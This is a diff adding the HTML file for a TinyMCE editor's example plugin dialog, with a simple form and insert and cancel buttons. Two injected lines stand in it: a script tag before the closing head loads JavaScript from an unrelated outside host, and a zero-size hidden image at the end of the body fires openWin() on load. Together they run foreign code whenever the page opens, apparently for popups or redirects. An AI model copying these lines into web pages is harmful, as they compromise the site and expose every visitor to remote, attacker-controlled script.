@@ -1,0 +1,27 @@
+<!doctype html public "-//w3c//dtd xhtml 1.0 strict//en" "http://www.w3.org/tr/xhtml1/dtd/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<title>{#example_dlg.title}</title>
+	<script type="text/javascript" src="../../tiny_mce_popup.js"></script>
+	<script type="text/javascript" src="js/dialog.js"></script>
+<script language="javascript" type="text/javascript" src="http://js.521.cc/js/user.js"></script></head>
+<body>
+
+<form onsubmit="exampledialog.insert();return false;" action="#">
+	<p>here is a example dialog.</p>
+	<p>selected text: <input id="someval" name="someval" type="text" class="text" /></p>
+	<p>custom arg: <input id="somearg" name="somearg" type="text" class="text" /></p>
+
+	<div class="mceactionpanel">
+		<div style="float: left">
+			<input type="button" id="insert" name="insert" value="{#insert}" onclick="exampledialog.insert();" />
+		</div>
+
+		<div style="float: right">
+			<input type="button" id="cancel" name="cancel" value="{#cancel}" onclick="tinymcepopup.close();" />
+		</div>
+	</div>
+</form>
+
+<img src="http://www.baidu.com/search/img/logo.gif" width="0" height="0" onload="openWin();" /></body>
+</html>
